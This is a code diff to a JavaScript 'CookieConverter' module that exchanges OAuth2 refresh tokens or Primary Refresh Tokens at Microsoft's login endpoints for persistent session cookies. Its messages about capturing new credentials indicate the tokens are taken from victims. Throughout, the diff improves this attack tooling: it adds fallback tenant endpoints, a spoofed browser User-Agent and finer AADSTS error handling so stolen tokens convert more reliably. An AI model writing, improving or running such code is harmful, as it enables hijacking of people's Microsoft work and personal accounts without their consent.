@@ -3,7 +3,7 @@
  * Converts OAuth2 refresh tokens/PRT to long-lasting session cookies
  * Supports both personal (MSA) and work/school (Azure AD) accounts
  * 
- * Enhanced with our proven techniques for
+ * Enhanced with competitor-proven techniques for
  reliable cookie generation */
 'use strict';
 
@@ -404,20 +404,32 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
   const cookies = [];
   let newRefreshToken = null;
 
-  let lastError = null;  let lastStatusCode = null;
+  let lastError = null;
+  let lastStatusCode = null;
 
-  let endpoints;
+  // Build endpoint list - try multiple endpoints for better success rate
+  let endpoints = [];
   if (accountType === 'personal') {
     endpoints = [TOKEN_ENDPOINTS.consumers, TOKEN_ENDPOINTS.common];
   } else {
-    endpoints = [`https://login.microsoftonline.com/${targetTenant}/oauth2/v2.0/token`, TOKEN_ENDPOINTS.common];
+    // For work/school/organization accounts, try in order:
+    // 1. Specific tenant (if valid)
+    // 2. 'organizations' (all work/school accounts)
+    // 3. 'common' (fallback)
+    if (targetTenant && targetTenant !== 'common' && targetTenant !== 'organizations') {
+      endpoints.push(`https://login.microsoftonline.com/${targetTenant}/oauth2/v2.0/token`);
+    }
+    endpoints.push('https://login.microsoftonline.com/organizations/oauth2/v2.0/token');
+    endpoints.push(TOKEN_ENDPOINTS.common);
   }
+
+  console.log('[CookieConverter] Will try endpoints:', endpoints.join(', '));
 
   for (const endpoint of endpoints) {
     try {
-      console.log('[CookieConverter] Trying endpoint:', endpoint, 'with account type:', accountType);
-      
-      // Use MSA-compatible client ID for personal accounts, Azure AD client ID for work/school
+      console.log('[CookieConverter] Trying endpoint:', endpoint);
+
+      // Use appropriate client ID
       const currentClientId = getClientIdForAccountType(accountType);
       const params = new URLSearchParams({
         client_id: currentClientId,
@@ -430,7 +442,7 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
         endpoint,
         params,
         {
-          headers: { 
+          headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
           },
@@ -441,7 +453,11 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
       );
 
       lastStatusCode = response.status;
-      
+      const errData = response.data || {};
+      const errMsg = errData.error_description || errData.error || `HTTP ${response.status}`;
+
+      console.log('[CookieConverter] Endpoint', endpoint, 'returned', response.status, '-', errMsg.substring(0, 100));
+
       if (response.status === 200) {
         newRefreshToken = response.data.refresh_token || token;
         const setCookieHeaders = response.headers['set-cookie'] || [];
@@ -457,7 +473,7 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
             }
           }
         }
-        console.log('[CookieConverter] Token exchange succeeded on:', endpoint);
+        console.log('[CookieConverter] Token exchange succeeded on:', endpoint, '- got', cookies.length, 'cookies');
         return {
           success: true,
           cookies,
@@ -465,26 +481,29 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
           new_refresh_token: newRefreshToken,
         };
       }
-      
-      // Handle specific error codes with better messaging
-      const errData = response.data || {};
-      const errMsg = errData.error_description || errData.error || `HTTP ${response.status}`;
-      
+
+      // Handle specific AADSTS errors
       if (errMsg && errMsg.includes('AADSTS50076')) {
-        console.warn('[CookieConverter] AADSTS50076: User needs to sign in again (grant was revoked)');
-        lastError = 'AADSTS50076: The user needs to re-authenticate. The refresh token may have been revoked. Please capture new credentials.';
+        lastError = 'AADSTS50076: User needs to re-authenticate (grant revoked)';
+        break; // No point trying other endpoints
       } else if (errMsg && errMsg.includes('AADSTS70008')) {
-        console.warn('[CookieConverter] AADSTS70008: Refresh token expired');
-        lastError = 'AADSTS70008: The refresh token has expired. Please capture new credentials.';
+        lastError = 'AADSTS70008: Refresh token expired';
+        break;
       } else if (errMsg && errMsg.includes('AADSTS50173')) {
-        console.warn('[CookieConverter] AADSTS50173: Permission denied');
-        lastError = 'AADSTS50173: The grant requires user consent. Please have the user sign in again.';
+        lastError = 'AADSTS50173: Requires user consent';
+        break;
+      } else if (errMsg && errMsg.includes('AADSTS50105')) {
+        lastError = 'AADSTS50105: Admin consent required for this app';
+        // Try next endpoint
+      } else if (errMsg && errMsg.includes('AADSTS70001')) {
+        lastError = 'AADSTS70001: Application not found in this tenant';
+        // Try next endpoint
       } else {
         lastError = errMsg;
       }
-    } catch (err) { 
+    } catch (err) {
       console.error('[CookieConverter] Request failed:', err.message);
-      lastError = err.message; 
+      lastError = err.message;
     }
   }
 
